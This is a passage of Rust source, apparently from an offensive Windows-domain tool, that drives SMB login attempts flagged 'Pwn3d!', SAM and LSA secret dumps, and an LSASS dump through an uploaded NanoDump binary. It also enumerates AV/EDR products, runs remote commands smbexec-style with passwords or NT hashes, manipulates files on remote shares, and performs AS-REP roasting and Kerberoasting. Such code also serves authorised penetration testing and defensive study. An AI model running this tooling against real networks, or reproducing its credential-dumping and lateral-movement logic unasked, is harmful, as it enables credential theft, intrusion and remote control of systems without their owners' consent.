                admin = client.check_admin().await;
                client.disconnect().await;
            }

            let admin_tag = if admin { " (Pwn3d!)" } else { "" };
            let _ = tx.send(RuntimeEvent::Log {
                level: if success {
                    LogLevel::Success
                } else {
                    LogLevel::Error
                },
                message: if success {
                    format!(
                        "{}: ✔ login réussi en tant que {cred_label_clone}{admin_tag}",
                        ip
                    )
                } else {
                    match error_detail {
                        Some(detail) => {
                            format!("{ip}: ✘ login échoué pour {cred_label_clone} — {detail}")
                        }
                        None => format!("{ip}: ✘ login échoué pour {cred_label_clone}"),
                    }
                },
            });

            let _ = tx.send(RuntimeEvent::LoginResult {
                ip,
                cred_label: cred_label_clone,
                success,
                admin,
            });
        });
    }

    /// Enumerate shares on a host and send result back.
    pub fn spawn_share_enum(
        &self,
        host_node_id: usize,
        ip: String,
        hostname: String,
        cred: CredentialRecord,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: énumération des shares..."),
        });

        let ip_clone = ip.clone();
        let hostname_clone = hostname.clone();
        let smb_cred = match cred_to_smb(&cred) {
            Ok(credential) => credential,
            Err(error) => {
                let _ = tx.send(RuntimeEvent::ShareEnumResult {
                    host_node_id,
                    ip,
                    hostname,
                    shares: Vec::new(),
                    error: Some(error),
                    cred_label: Some(crate::state::cred_label(&cred)),
                });
                return;
            }
        };
        // Same label format as spawn_login_attempt — resolve_cred matches on it.
        let cred_label = crate::state::cred_label(&cred);
        self.runtime.spawn(async move {
            let mut client = SmbClient::new(&ip_clone).with_credential(smb_cred);
            let (shares, error) = match client.connect().await {
                Ok(()) => match client.enum_shares_with_access().await {
                    Ok(shares) => {
                        let formatted: Vec<String> = shares
                            .iter()
                            .map(|s| {
                                format!(
                                    "{} [{}] ({})",
                                    s.name,
                                    s.share_type.display_str(),
                                    s.access.display_str()
                                )
                            })
                            .collect();
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Success,
                            message: format!("{ip_clone}: {} share(s) trouvé(s)", formatted.len()),
                        });
                        client.disconnect().await;
                        (formatted, None)
                    }
                    Err(e) => {
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Error,
                            message: format!("{ip_clone}: erreur enum shares: {e}"),
                        });
                        client.disconnect().await;
                        (Vec::new(), Some(e.to_string()))
                    }
                },
                Err(error) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip_clone}: connexion échouée pour enum shares: {error}"),
                    });
                    (Vec::new(), Some(error.to_string()))
                }
            };

            let _ = tx.send(RuntimeEvent::ShareEnumResult {
                host_node_id,
                ip: ip_clone,
                hostname: hostname_clone,
                shares,
                error,
                cred_label: Some(cred_label),
            });
        });
    }

    pub fn spawn_user_enum(
        &self,
        host_node_id: usize,
        ip: String,
        hostname: String,
        cred: crate::state::CredentialRecord,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: énumération des utilisateurs..."),
        });

        let ip_clone = ip.clone();
        let hostname_clone = hostname.clone();
        let smb_cred = match cred_to_smb(&cred) {
            Ok(credential) => credential,
            Err(error) => {
                let _ = tx.send(RuntimeEvent::UserEnumResult {
                    host_node_id,
                    ip,
                    hostname,
                    result: Err(error),
                });
                return;
            }
        };
        self.runtime.spawn(async move {
            // Keep an explicitly typed SMB port (e.g. a container harness on
            // :1445); the common dispatcher derives port 389 for LDAP and
            // falls back to SAMR when LDAP is unavailable.
            let target = netraze_protocols::targets::with_default_port(&ip_clone, 445);
            let result = netraze_protocols::users::enum_users_detailed(&target, &smb_cred).await;

            match &result {
                Ok(outcome) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Success,
                        message: format!(
                            "{ip_clone}: {} utilisateur(s) trouvé(s) via {:?}{}",
                            outcome.users.len(),
                            outcome.source,
                            if outcome.fallback_used {
                                " (fallback)"
                            } else {
                                ""
                            }
                        ),
                    });
                }
                Err(e) => {
                    let (level, prefix) = if e.contains("ACCESS_DENIED (0x5)") {
                        (LogLevel::Warning, "accès refusé")
                    } else {
                        (LogLevel::Error, "erreur enum users")
                    };
                    let _ = tx.send(RuntimeEvent::Log {
                        level,
                        message: format!("{ip_clone}: {prefix}: {e}"),
                    });
                }
            }

            let _ = tx.send(RuntimeEvent::UserEnumResult {
                host_node_id,
                ip: ip_clone,
                hostname: hostname_clone,
                result,
            });
        });
    }

    pub fn spawn_dump_sam(
        &self,
        host_node_id: usize,
        ip: String,
        hostname: String,
        cred: crate::state::CredentialRecord,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: SAM dump en cours..."),
        });

        let ip2 = ip.clone();
        let hostname2 = hostname.clone();
        let smb_cred = match cred_to_smb(&cred) {
            Ok(credential) => credential,
            Err(error) => {
                let _ = tx.send(RuntimeEvent::DumpResult {
                    host_node_id,
                    ip,
                    hostname,
                    dump_type: "SAM".to_owned(),
                    entries: Vec::new(),
                    error: Some(error),
                });
                return;
            }
        };
        self.runtime.spawn(async move {
            let result = remote_dump_sam(&ip2, &smb_cred).await;

            let (entries, error) = match result {
                Ok(dump) => {
                    let lines: Vec<String> = dump.hashes.iter().map(|h| h.to_string()).collect();
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Success,
                        message: format!("{ip2}: SAM dump — {} hash(es)", lines.len()),
                    });
                    let err = if dump.errors.is_empty() {
                        None
                    } else {
                        Some(dump.errors.join("; "))
                    };
                    (lines, err)
                }
                Err(e) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip2}: SAM dump failed: {e}"),
                    });
                    (Vec::new(), Some(e))
                }
            };

            let _ = tx.send(RuntimeEvent::DumpResult {
                host_node_id,
                ip: ip2,
                hostname: hostname2,
                dump_type: "SAM".to_string(),
                entries,
                error,
            });
        });
    }

    pub fn spawn_dump_lsa(
        &self,
        host_node_id: usize,
        ip: String,
        hostname: String,
        cred: crate::state::CredentialRecord,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: LSA dump en cours..."),
        });

        let ip2 = ip.clone();
        let hostname2 = hostname.clone();
        let smb_cred = match cred_to_smb(&cred) {
            Ok(credential) => credential,
            Err(error) => {
                let _ = tx.send(RuntimeEvent::DumpResult {
                    host_node_id,
                    ip,
                    hostname,
                    dump_type: "LSA".to_owned(),
                    entries: Vec::new(),
                    error: Some(error),
                });
                return;
            }
        };
        self.runtime.spawn(async move {
            let result = remote_dump_lsa(&ip2, &smb_cred).await;

            let (entries, error) = match result {
                Ok(dump) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Success,
                        message: format!("{ip2}: LSA dump — {} secret(s)", dump.secrets.len()),
                    });
                    let err = if dump.errors.is_empty() {
                        None
                    } else {
                        Some(dump.errors.join("; "))
                    };
                    (dump.secrets, err)
                }
                Err(e) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip2}: LSA dump failed: {e}"),
                    });
                    (Vec::new(), Some(e))
                }
            };

            let _ = tx.send(RuntimeEvent::DumpResult {
                host_node_id,
                ip: ip2,
                hostname: hostname2,
                dump_type: "LSA".to_string(),
                entries,
                error,
            });
        });
    }

    pub fn spawn_dump_nanodump(
        &self,
        host_node_id: usize,
        ip: String,
        hostname: String,
        cred: CredentialRecord,
        binary_path: String,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: NanoDump LSASS en cours..."),
        });

        let ip2 = ip.clone();
        let hostname2 = hostname.clone();
        let smb_cred = match cred_to_smb(&cred) {
            Ok(credential) => credential,
            Err(error) => {
                let _ = tx.send(RuntimeEvent::DumpResult {
                    host_node_id,
                    ip,
                    hostname,
                    dump_type: "NANODUMP".to_owned(),
                    entries: Vec::new(),
                    error: Some(error),
                });
                return;
            }
        };
        self.runtime.spawn(async move {
            let binary_bytes = match std::fs::read(&binary_path) {
                Ok(b) => b,
                Err(e) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip2}: NanoDump binary read failed: {e}"),
                    });
                    let _ = tx.send(RuntimeEvent::DumpResult {
                        host_node_id,
                        ip: ip2,
                        hostname: hostname2,
                        dump_type: "NANODUMP".to_string(),
                        entries: Vec::new(),
                        error: Some(format!("cannot read binary: {e}")),
                    });
                    return;
                }
            };

            let tx2 = tx.clone();
            let ip3 = ip2.clone();
            let log_fn: Box<dyn Fn(&str) + Send + Sync> = Box::new(move |line: &str| {
                let _ = tx2.send(RuntimeEvent::Log {
                    level: LogLevel::Info,
                    message: format!("{ip3}: [nanodump] {line}"),
                });
            });

            let result =
                remote_lsass_dump(&ip2, &smb_cred, &binary_bytes, "--fork", &*log_fn).await;

            match result {
                Ok(r) => {
                    let safe_ip = ip2.replace(':', "_").replace('.', "_");
                    let dmp_path = format!("lsass_{safe_ip}.dmp");
                    match std::fs::write(&dmp_path, &r.dump_bytes) {
                        Ok(()) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Success,
                                message: format!(
                                    "{ip2}: NanoDump — {} bytes → {dmp_path}",
                                    r.dump_bytes.len()
                                ),
                            });
                            let _ = tx.send(RuntimeEvent::DumpResult {
                                host_node_id,
                                ip: ip2,
                                hostname: hostname2,
                                dump_type: "NANODUMP".to_string(),
                                entries: vec![dmp_path],
                                error: None,
                            });
                        }
                        Err(e) => {
                            let _ = tx.send(RuntimeEvent::Log {
                                level: LogLevel::Error,
                                message: format!("{ip2}: NanoDump save failed: {e}"),
                            });
                            let _ = tx.send(RuntimeEvent::DumpResult {
                                host_node_id,
                                ip: ip2,
                                hostname: hostname2,
                                dump_type: "NANODUMP".to_string(),
                                entries: Vec::new(),
                                error: Some(format!("save failed: {e}")),
                            });
                        }
                    }
                }
                Err(e) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip2}: NanoDump failed: {e}"),
                    });
                    let _ = tx.send(RuntimeEvent::DumpResult {
                        host_node_id,
                        ip: ip2,
                        hostname: hostname2,
                        dump_type: "NANODUMP".to_string(),
                        entries: Vec::new(),
                        error: Some(e),
                    });
                }
            }
        });
    }

    pub fn spawn_enum_av(
        &self,
        host_node_id: usize,
        ip: String,
        hostname: String,
        cred: CredentialRecord,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: AV/EDR enumeration en cours..."),
        });

        let ip2 = ip.clone();
        let hostname2 = hostname.clone();
        let smb_cred = match cred_to_smb(&cred) {
            Ok(credential) => credential,
            Err(error) => {
                let _ = tx.send(RuntimeEvent::EnumAvResult {
                    host_node_id,
                    ip,
                    hostname,
                    products: Vec::new(),
                    error: Some(error),
                });
                return;
            }
        };
        self.runtime.spawn(async move {
            // The portable backend is async — await it directly.
            let av_result = enum_av(&ip2, Some(&smb_cred)).await;

            let (products, error) = {
                let lines: Vec<String> = av_result.products.iter().map(|p| p.to_line()).collect();
                if lines.is_empty() {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Warning,
                        message: format!("{ip2}: No AV/EDR detected"),
                    });
                } else {
                    for p in &av_result.products {
                        let _ = tx.send(RuntimeEvent::Log {
                            level: LogLevel::Success,
                            message: format!("{ip2}: Found {} {}", p.name, p.status_label()),
                        });
                    }
                }
                let err = if av_result.errors.is_empty() {
                    None
                } else {
                    Some(av_result.errors.join("; "))
                };
                (lines, err)
            };

            let _ = tx.send(RuntimeEvent::EnumAvResult {
                host_node_id,
                ip: ip2,
                hostname: hostname2,
                products,
                error,
            });
        });
    }

    /// List a directory on a remote share. `rel_path` is relative to the
    /// share root (`""` = root). A missing credential surfaces as a browse
    /// error instead of a silent no-op.
    pub fn spawn_browse_directory(
        &self,
        browser_id: usize,
        host: String,
        share: String,
        rel_path: String,
        cred: Option<SmbCredential>,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let Some(cred) = cred else {
                let _ = tx.send(RuntimeEvent::BrowseResult {
                    browser_id,
                    entries: Vec::new(),
                    error: Some("no credential available for this share".to_string()),
                });
                return;
            };
            match list_directory(&host, &cred, &share, &rel_path).await {
                Ok(entries) => {
                    let mapped: Vec<(String, bool, u64)> = entries
                        .into_iter()
                        .map(|e| (e.name, e.is_dir, e.size))
                        .collect();
                    let _ = tx.send(RuntimeEvent::BrowseResult {
                        browser_id,
                        entries: mapped,
                        error: None,
                    });
                }
                Err(e) => {
                    let _ = tx.send(RuntimeEvent::BrowseResult {
                        browser_id,
                        entries: Vec::new(),
                        error: Some(e),
                    });
                }
            }
        });
    }

    /// Download `rel_path` on `share` to `local_path`.
    pub fn spawn_download(
        &self,
        browser_id: usize,
        host: String,
        share: String,
        rel_path: String,
        local_path: String,
        cred: Option<SmbCredential>,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let Some(cred) = cred else {
                let _ = tx.send(RuntimeEvent::FileOpResult {
                    browser_id,
                    success: false,
                    message: "no credential available for this share".to_string(),
                });
                return;
            };
            let (success, message) =
                match download_file(&host, &cred, &share, &rel_path, &local_path).await {
                    Ok(()) => (true, format!("Downloaded to {local_path}")),
                    Err(e) => (false, e),
                };
            let _ = tx.send(RuntimeEvent::FileOpResult {
                browser_id,
                success,
                message,
            });
        });
    }

    /// Upload `local_path` to `rel_path` on `share`.
    pub fn spawn_upload(
        &self,
        browser_id: usize,
        local_path: String,
        host: String,
        share: String,
        rel_path: String,
        cred: Option<SmbCredential>,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let Some(cred) = cred else {
                let _ = tx.send(RuntimeEvent::FileOpResult {
                    browser_id,
                    success: false,
                    message: "no credential available for this share".to_string(),
                });
                return;
            };
            let result = upload_file(&host, &cred, &share, &rel_path, &local_path).await;
            let _ = tx.send(RuntimeEvent::FileOpResult {
                browser_id,
                success: result.is_ok(),
                message: match result {
                    Ok(()) => "Upload complete".to_string(),
                    Err(e) => e,
                },
            });
        });
    }

    /// Create a directory at `rel_path` on `share`.
    pub fn spawn_create_folder(
        &self,
        browser_id: usize,
        host: String,
        share: String,
        rel_path: String,
        cred: Option<SmbCredential>,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let Some(cred) = cred else {
                let _ = tx.send(RuntimeEvent::FileOpResult {
                    browser_id,
                    success: false,
                    message: "no credential available for this share".to_string(),
                });
                return;
            };
            let result = create_directory(&host, &cred, &share, &rel_path).await;
            let _ = tx.send(RuntimeEvent::FileOpResult {
                browser_id,
                success: result.is_ok(),
                message: match result {
                    Ok(()) => "Folder created".to_string(),
                    Err(e) => e,
                },
            });
        });
    }

    /// Delete `rel_path` on `share` (file or directory — directories must
    /// be empty, same contract as the old RemoveDirectoryW backend).
    pub fn spawn_delete(
        &self,
        browser_id: usize,
        host: String,
        share: String,
        rel_path: String,
        is_dir: bool,
        cred: Option<SmbCredential>,
    ) {
        let tx = self.log_tx.clone();
        self.runtime.spawn(async move {
            let Some(cred) = cred else {
                let _ = tx.send(RuntimeEvent::FileOpResult {
                    browser_id,
                    success: false,
                    message: "no credential available for this share".to_string(),
                });
                return;
            };
            let result = if is_dir {
                delete_remote_directory(&host, &cred, &share, &rel_path).await
            } else {
                delete_remote_file(&host, &cred, &share, &rel_path).await
            };
            let _ = tx.send(RuntimeEvent::FileOpResult {
                browser_id,
                success: result.is_ok(),
                message: match result {
                    Ok(()) => "Deleted".to_string(),
                    Err(e) => e,
                },
            });
        });
    }

    /// Fingerprint a host via raw SMB2 negotiate + NTLMSSP challenge (no auth needed).
    pub fn spawn_fingerprint(&self, ip: String) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: SMB fingerprint en cours..."),
        });

        self.runtime.spawn(async move {
            let ip2 = ip.clone();
            let result = tokio::task::spawn_blocking(move || smb_fingerprint(&ip2)).await;

            match result {
                Ok(Ok(fp)) => {
                    let nxc_line = fp.nxc_line(&ip);
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Success,
                        message: nxc_line,
                    });
                    let _ = tx.send(RuntimeEvent::FingerprintResult {
                        ip,
                        hostname: fp.hostname,
                        domain: if fp.dns_domain.is_empty() {
                            fp.domain
                        } else {
                            fp.dns_domain
                        },
                        os_info: fp.os_info,
                        signing: fp.signing,
                        smbv1: fp.smbv1,
                    });
                }
                Ok(Err(e)) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Warning,
                        message: format!("{ip}: fingerprint failed: {e}"),
                    });
                }
                Err(e) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Warning,
                        message: format!("{ip}: fingerprint task panic: {e}"),
                    });
                }
            }
        });
    }

    /// Execute a command on a remote host via SMB (smbexec-style).
    /// Requires admin credentials. Output is sent back via `ExecResult`.
    pub fn spawn_exec_command(
        &self,
        console_id: u64,
        ip: String,
        username: String,
        domain: String,
        secret: String,
        cred_type: crate::state::CredType,
        command: String,
    ) {
        let tx = self.log_tx.clone();
        let _ = tx.send(RuntimeEvent::Log {
            level: LogLevel::Info,
            message: format!("{ip}: exec `{command}`"),
        });

        self.runtime.spawn(async move {
            // The portable exec backend is async — await it directly so the
            // runtime can drive other tasks while the ADMIN$ poll loop
            // sleeps. Trace lines still stream to the UI through `live_tx`
            // (the closure stays sync).
            let live_tx = tx.clone();
            let ip_for_log = ip.clone();
            let logger = |line: &str| {
                let _ = live_tx.send(RuntimeEvent::Log {
                    level: LogLevel::Info,
                    message: format!("{ip_for_log}[trace] {line}"),
                });
            };
            let result = match cred_type {
                crate::state::CredType::Hash => {
                    match SmbCredential::with_hash(&username, &domain, &secret) {
                        Ok(c) => execute_command_live(&ip, Some(&c), &command, &logger).await,
                        Err(e) => (Err(format!("hash invalide: {e}")), Vec::new()),
                    }
                }
                crate::state::CredType::Password => {
                    let cred = SmbCredential::new(&username, &domain, &secret);
                    execute_command_live(&ip, Some(&cred), &command, &logger).await
                }
                crate::state::CredType::Aes128Key | crate::state::CredType::Aes256Key => (
                    Err("Kerberos AES keys cannot authenticate SMB".to_owned()),
                    Vec::new(),
                ),
            };

            match result {
                (Ok(output), _trace) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Success,
                        message: format!("{ip}: exec ok ({} bytes)", output.len()),
                    });
                    let _ = tx.send(RuntimeEvent::ExecResult {
                        console_id,
                        command,
                        output,
                        error: None,
                    });
                }
                (Err(e), _trace) => {
                    let _ = tx.send(RuntimeEvent::Log {
                        level: LogLevel::Error,
                        message: format!("{ip}: exec failed: {e}"),
                    });
                    let _ = tx.send(RuntimeEvent::ExecResult {
                        console_id,
                        command,
                        output: String::new(),
                        error: Some(e),
                    });
                }
            }
        });
    }
}

async fn run_kerberos_assessment(
    target: &str,
    endpoint: &str,
    credential: Option<&CredentialRecord>,
    options: &KerberosScanOptions,
    timeout: Duration,
) -> Result<
    (
        String,
        netraze_protocols::kerberos::KerberosAssessmentOutcome,
        Option<netraze_protocols::kerberos::TicketGrantingTicket>,
    ),
    String,
> {
    use netraze_core::KerberosTargetError;
    use netraze_protocols::kerberos::{
        KerberosAssessmentTargets, KerberosClient, KerberosClientConfig, targets_from_inventory,
    };

    let host_key = netraze_protocols::targets::endpoint_host(target).to_ascii_lowercase();
    let mut outcome = netraze_protocols::kerberos::KerberosAssessmentOutcome::default();
    let mut acquired_tgt = None;
    let mut inventory = options.inventories.get(&host_key).cloned();
    let ticket_cache = options
        .ticket_path
        .as_ref()
        .map(netraze_protocols::kerberos::import_ticket_file)
        .transpose()
        .map_err(|error| format!("Kerberos ticket import failed: {error}"))?;

    if options.use_ldap_discovery && inventory.is_none() {
        if let Some(cache) = &ticket_cache {
            let service_host = options.ticket_service_host.as_deref().ok_or_else(|| {
                "Ticket-backed LDAP discovery requires the exact LDAP service host".to_owned()
            })?;
            let service_ticket = cache
                .select(&netraze_protocols::kerberos::TicketSelector {
                    service_principal: Some(format!("ldap/{service_host}")),
                    ..netraze_protocols::kerberos::TicketSelector::default()
                })
                .and_then(netraze_protocols::kerberos::KerberosTicket::to_service_ticket)
                .map_err(|error| {
                    format!("No current ldap/{service_host} ticket is available: {error}")
                })?;
            let ldap_endpoint = netraze_protocols::targets::with_default_port(target, 389);
            let mut config = netraze_protocols::ldap::LdapClientConfig::new(&ldap_endpoint);
            config.connect_timeout = timeout;
            config.operation_timeout = timeout;
            match netraze_protocols::ldap::inventory_with_authentication(
                config,
                netraze_protocols::ldap::LdapAuthentication::Kerberos {
                    service_host: service_host.to_owned(),
                    ticket: Box::new(service_ticket),
                },
            )
            .await
            {
                Ok(value) => inventory = Some(value),
                Err(error) => outcome.errors.push(KerberosTargetError {
                    target: ldap_endpoint,
                    message: error.to_string(),
                }),
            }
        } else if let Some(credential) = credential {
            match cred_to_ldap_auth(credential) {
                Ok(authentication) => {
                    let ldap_endpoint = netraze_protocols::targets::with_default_port(target, 389);
                    let mut config = netraze_protocols::ldap::LdapClientConfig::new(&ldap_endpoint);
                    config.connect_timeout = timeout;
                    config.operation_timeout = timeout;
                    match netraze_protocols::ldap::inventory_with_authentication(
                        config,
                        authentication,
                    )
                    .await
                    {
                        Ok(value) => inventory = Some(value),
                        Err(error) => outcome.errors.push(KerberosTargetError {
                            target: ldap_endpoint,
                            message: redact_secret(&error.to_string(), &credential.secret),
                        }),
                    }
                }
                Err(error) => outcome.errors.push(KerberosTargetError {
                    target: "LDAP discovery".to_owned(),
                    message: error,
                }),
            }
        } else {
            outcome.errors.push(KerberosTargetError {
                target: "LDAP discovery".to_owned(),
                message: "no selected credential is available for directory discovery".to_owned(),
            });
        }
    }

    let realm = options
        .realm
        .as_deref()
        .filter(|value| !value.trim().is_empty())
        .map(|value| value.trim().to_ascii_uppercase())
        .or_else(|| inventory.as_ref().and_then(realm_from_inventory))
        .or_else(|| {
            credential
                .map(|value| value.domain.trim())
                .filter(|value| !value.is_empty())
                .map(str::to_ascii_uppercase)
        })
        .or_else(|| {
            ticket_cache
                .as_ref()
                .map(|cache| cache.primary_realm().to_ascii_uppercase())
        })
        .ok_or_else(|| {
            "Kerberos realm is required when it cannot be derived from LDAP or the credential domain"
                .to_owned()
        })?;

    let mut targets = KerberosAssessmentTargets {
        as_rep_principals: options.explicit_principals.clone(),
        service_principals: options.explicit_spns.clone(),
    };
    if let Some(inventory) = &inventory {
        let discovered = targets_from_inventory(inventory);
        targets
            .as_rep_principals
            .extend(discovered.as_rep_principals);
        targets
            .service_principals
            .extend(discovered.service_principals);
    }
    targets.normalize().map_err(|error| error.to_string())?;

    let mut config = KerberosClientConfig::new(endpoint, &realm);
    config.connect_timeout = timeout;
    config.operation_timeout = timeout;
    let client = KerberosClient::connect(config).map_err(|error| error.to_string())?;

    if options.assess_as_rep && !targets.as_rep_principals.is_empty() {
        let assessed = client
            .assess_as_rep(&targets.as_rep_principals)
            .await
            .map_err(|error| error.to_string())?;
        outcome.merge(assessed);
    }

    if options.assess_spns && !targets.service_principals.is_empty() {
        if let Some(cache) = &ticket_cache {
            match cache
                .select(&netraze_protocols::kerberos::TicketSelector {
                    realm: Some(realm.clone()),
                    ..netraze_protocols::kerberos::TicketSelector::default()
                })
                .and_then(netraze_protocols::kerberos::KerberosTicket::to_tgt)
            {
                Ok(tgt) => {
                    let assessed = client
                        .assess_spns(&tgt, &targets.service_principals)
                        .await
                        .map_err(|error| error.to_string())?;
                    outcome.merge(assessed);
                    acquired_tgt = Some(tgt);
                }
                Err(error) => outcome.errors.push(KerberosTargetError {
                    target: "Kerberoast ticket authentication".to_owned(),
                    message: error.to_string(),
                }),
            }
        } else if let Some(credential_record) = credential {
            match cred_to_kerberos(credential_record) {
                Ok(kerberos_credential) => match client
                    .request_tgt(&credential_record.username, &kerberos_credential)
                    .await
                {
                    Ok(tgt) => {
                        let assessed = client
                            .assess_spns(&tgt, &targets.service_principals)
                            .await
                            .map_err(|error| error.to_string())?;
                        outcome.merge(assessed);
                        acquired_tgt = Some(tgt);
                    }
                    Err(error) => outcome.errors.push(KerberosTargetError {
                        target: credential_record.username.clone(),
                        message: redact_secret(&error.to_string(), &credential_record.secret),
                    }),
                },
                Err(error) => outcome.errors.push(KerberosTargetError {
                    target: "Kerberoast authentication".to_owned(),
                    message: error,
                }),
            }
        } else {
            outcome.errors.push(KerberosTargetError {
                target: "Kerberoast authentication".to_owned(),
                message: "a password, NT hash, or AES key is required".to_owned(),
            });
        }
    }

    Ok((realm, outcome, acquired_tgt))
}

pub(crate) fn realm_from_inventory(inventory: &netraze_core::DirectoryInventory) -> Option<String> {
    let labels = inventory
        .server
        .default_naming_context
        .split(',')
        .filter_map(|rdn| {
            rdn.trim()
                .strip_prefix("DC=")
                .or_else(|| rdn.trim().strip_prefix("dc="))
        })
        .filter(|label| !label.is_empty())
        .collect::<Vec<_>>();
    (!labels.is_empty()).then(|| labels.join(".").to_ascii_uppercase())
}

pub(crate) fn cred_to_kerberos(
    cred: &crate::state::CredentialRecord,
) -> Result<netraze_protocols::kerberos::KerberosCredential, String> {
    use crate::state::CredType;
    use netraze_protocols::kerberos::KerberosCredential;

    if cred.username.trim().is_empty() {
        return Err("Kerberos authentication requires a username".to_owned());
    }
    if cred.secret.is_empty() {
        return Err("Kerberos authentication requires a password, NT hash, or AES key".to_owned());
    }
    match cred.cred_type {
        CredType::Password => Ok(KerberosCredential::Password(cred.secret.clone())),
        CredType::Hash => {
            KerberosCredential::from_nt_hash_hex(&cred.secret).map_err(|error| error.to_string())
        }
        CredType::Aes128Key => {
            KerberosCredential::from_aes128_hex(&cred.secret).map_err(|error| error.to_string())
        }
        CredType::Aes256Key => {
            KerberosCredential::from_aes256_hex(&cred.secret).map_err(|error| error.to_string())
        }
    }
}

/// Convert a desktop `CredentialRecord` into an `SmbCredential` usable by
/// the protocol layer.
pub(crate) fn cred_to_smb(cred: &crate::state::CredentialRecord) -> Result<SmbCredential, String> {
    match cred.cred_type {
        crate::state::CredType::Password => Ok(SmbCredential::new(
            &cred.username,
            &cred.domain,
            &cred.secret,
        )),
        crate::state::CredType::Hash => {
            SmbCredential::with_hash(&cred.username, &cred.domain, &cred.secret)
        }
        crate::state::CredType::Aes128Key | crate::state::CredType::Aes256Key => {
            Err("Kerberos AES keys cannot authenticate SMB".to_owned())
        }
    }
}

pub(crate) fn cred_to_ntlm(
    cred: &crate::state::CredentialRecord,
) -> Result<netraze_protocols::ntlm::NtlmCredential, String> {
    if cred.username.trim().is_empty() {
        return Err("LDAP NTLM authentication requires a username".to_owned());
    }
    if cred.secret.is_empty() {
        return Err("LDAP NTLM authentication requires a password or NT hash".to_owned());
    }
    match cred.cred_type {
        crate::state::CredType::Password => Ok(netraze_protocols::ntlm::NtlmCredential::Password(
            cred.secret.clone(),
        )),
        crate::state::CredType::Hash => {
            netraze_protocols::ntlm::NtlmCredential::from_nt_hash_hex(&cred.secret)
                .map_err(|error| error.to_string())
        }
        crate::state::CredType::Aes128Key | crate::state::CredType::Aes256Key => {
            Err("LDAP NTLM authentication does not accept Kerberos AES keys".to_owned())
        }
    }
}

pub(crate) fn cred_to_ldap_auth(
    cred: &crate::state::CredentialRecord,
) -> Result<netraze_protocols::ldap::LdapAuthentication, String> {
    use netraze_protocols::ldap::LdapAuthentication;
    use netraze_protocols::ntlm::NtlmCredential;

    if cred.username.trim().is_empty() {
        return if cred.domain.is_empty()
            && cred.secret.is_empty()
            && matches!(cred.cred_type, crate::state::CredType::Password)
        {
            Ok(LdapAuthentication::Anonymous)
        } else {
            Err("Anonymous LDAP requires empty username, domain, password, and NT hash".into())
        };
    }

    let credential = if cred.secret.is_empty() {
        if cred.username.eq_ignore_ascii_case("Guest")
            && matches!(cred.cred_type, crate::state::CredType::Password)
        {
            // This is a real NTLM attempt for the Guest account, not an
            // unauthenticated simple bind or an automatic guest downgrade.
            NtlmCredential::Password(String::new())
        } else {
            return Err("LDAP requires a password or NT hash, except for the Guest account".into());
        }
    } else {
        cred_to_ntlm(cred)?
    };
    Ok(LdapAuthentication::Ntlm {
        username: cred.username.clone(),
        domain: cred.domain.clone(),
        credential,
    })
}

fn redact_secret(message: &str, secret: &str) -> String {
    if secret.is_empty() {
        return message.to_owned();
    }
    let mut redacted = message.replace(secret, "<redacted>");
    redacted = redacted.replace(&secret.to_ascii_lowercase(), "<redacted>");
    redacted.replace(&secret.to_ascii_uppercase(), "<redacted>")
}

#[cfg(test)]
mod ldap_runtime_tests {
    use super::*;
    use crate::state::{CredType, anonymous_record};

    fn synthetic_nt_hash_hex() -> String {
        (0_u8..16)
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>()
    }

    #[test]
    fn converts_saved_password_and_hash_credentials_strictly() {
        let password = CredentialRecord {
            username: "alice".to_owned(),
            domain: "EXAMPLE".to_owned(),
            secret: "test-only-password".to_owned(),
            ..anonymous_record()
        };
        assert!(matches!(
            cred_to_ntlm(&password),
            Ok(netraze_protocols::ntlm::NtlmCredential::Password(_))
        ));

        let hash = synthetic_nt_hash_hex();
        let valid_hash = CredentialRecord {
            cred_type: CredType::Hash,
            secret: hash,
            ..password.clone()
        };
        assert!(matches!(
            cred_to_ntlm(&valid_hash),
            Ok(netraze_protocols::ntlm::NtlmCredential::NtHash(_))
        ));

        let invalid_hash = CredentialRecord {
            secret: "not-a-hash".to_owned(),
            ..valid_hash
        };
        assert!(cred_to_ntlm(&invalid_hash).is_err());
    }

    #[test]
